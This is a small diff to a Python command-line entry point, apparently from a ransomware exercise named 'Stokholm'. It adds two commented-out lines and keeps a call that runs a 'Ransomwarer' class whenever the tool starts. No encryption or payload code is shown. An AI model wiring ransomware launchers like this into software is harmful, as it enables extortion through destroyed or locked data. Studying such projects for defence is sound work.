@@ -33,8 +33,10 @@ class StokholmManager():
         
     def execute(self):
         parser, args = self.__parse_args()
-        
+
 def execute_from_command_line():
     stokholm_manager = StokholmManager(sys.argv)
     stokholm_manager.execute()
+    # stoklhom_ransmoware = Ransomwarer()
+    # stoklhom_ransmoware.execute
     Ransomwarer().execute()
